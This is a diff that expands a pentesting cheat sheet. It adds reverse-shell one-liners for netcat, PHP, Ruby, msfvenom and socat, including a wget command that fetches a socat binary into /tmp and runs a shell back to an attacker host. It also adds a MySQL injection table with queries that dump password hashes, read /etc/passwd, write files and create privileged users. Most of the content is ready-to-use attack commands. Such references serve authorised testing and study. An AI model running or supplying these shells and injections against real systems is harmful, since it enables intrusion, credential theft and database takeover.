@@ -9,7 +9,9 @@
     + [perl](#perl)
     + [python](#python)
     + [php](#php)
+    + [ruby](#ruby)
     + [msfvenom](#msfvenom)
+    + [socat](#socat)
   * [spawning tty shells](#spawning-shells)
     + [python](#python)
     + [bash/sh](#bash/sh)
@@ -25,6 +27,9 @@
   * [netcat](#netcat)
     + [files](#SENDING-FILES-BETWEEN-SYSTEMS)
     + [directories](#SENDING-WHOLE-DIRECTORIES)
+- [db injections](#db-injections)
+  * [mysql](#mysql)
+  * [postgres](#postgresql)
 
 ---
 
@@ -42,6 +47,11 @@ nc -e /bin/sh [LOCAL IP] [PORT]
 <small>catching:</small>
 ```
 nc -lvp [PORT]
+```
+
+<small>if the wrong version of netcat is installed, possible you could still get a shell by running:</small>
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LOCAL IP] [PORT] >/tmp/f
 ```
 
 ### bash
@@ -64,7 +74,48 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ### php
 
+```
+php -r '$sock=fsockopen("[LOCAL IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### ruby
+
+```
+ruby -rsocket -e'f=TCPSocket.open("[LOCAL IP]",[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
 ### msfvenom
+
+in `metasploit`, you can generate paylods (under `cmd/unix`) for making one-liner bind or reverse shells
+
+_see what's available_:
+```
+msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
+```
+
+_generate payload_:
+```
+msfvenom -p cmd/unix/reverse_netcat LHOST=[LOCAL IP] LPORT=[LOCAL PORT] R
+```
+
+### socat
+
+socat can be used to pass full TTY’s over TCP connections, if it's installed on a victim server you can launch a reverse shell with it, but you have to catch the connection with `socat`.
+
+_local_:
+```
+socat file:`tty`,raw,echo=0 tcp-listen:[PORT]
+```
+
+_remote_:
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LOCAL IP]:[PORT]
+```
+
+<small>if it's not installed, it's possible to download it to a writable directory, chmod it, then execute a rev shell</small>
+```
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LOCAL IP]:[PORT]
+```
 
 ----
 ## spawning shells
@@ -123,7 +174,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 _remote shell_:
 ```
-## background process netcat in the remote shell
+## background process netcat in the remote shell by hitting CTRL+Z
 user@remote:$ ^Z
 ```
 _local env_:
@@ -223,3 +274,38 @@ _sender_:
 cd source_directory
 tar cf - . | nc [RECEIVER IP] [PORT]
 ```
+---
+
+# DB injections
+
+## MySQL
+
+|operation|sql|
+|---|---|
+|version|`SELECT @@version`|
+|current user|`SELECT user();` or `SELECT system_user();`|
+|get comments|`SELECT 1; #comment` or `SELECT /*comment*/1;`|
+|list users|`SELECT user FROM mysql.user; — priv`|
+|list password hashes|`SELECT host, user, password FROM mysql.user; — priv`|
+|list DBA accounts|`SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv`|
+|list databases|`SELECT schema_name FROM information_schema.schemata; SELECT distinct(db) FROM mysql.db — priv`|
+|current db|`SELECT database()`
+|list tables|`SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`
+|list columns|`SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`|
+|find tables from column name|`SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’`|
+|if statement|`SELECT if(1=1,’foo’,'bar’); — returns ‘foo’`|
+|concat|`SELECT CONCAT(‘A’,'B’,'C’); # returns ABC`|
+|substr|`SELECT substr(‘abcd’, 3, 1); # returns c`|
+|local file access|`…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)` — priv, can only read world-readable files. `SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’; — priv, write to file system`|
+|hostname, IP|`SELECT @@hostname;`|
+|create user|`CREATE USER test1 IDENTIFIED BY ‘pass1′;`|
+|delete user|`DROP USER test1;`|
+|make DBA user|`GRANT ALL PRIVILEGES ON *.* TO test1@’%';`|
+|location of db files|`SELECT @@datadir;`|
+|default/system db|`information_schema (>= mysql 5.0)`|
+
+## PostgresQL
+
+|operation|sql|
+|---|---|
+|version|`SELECT version()`|
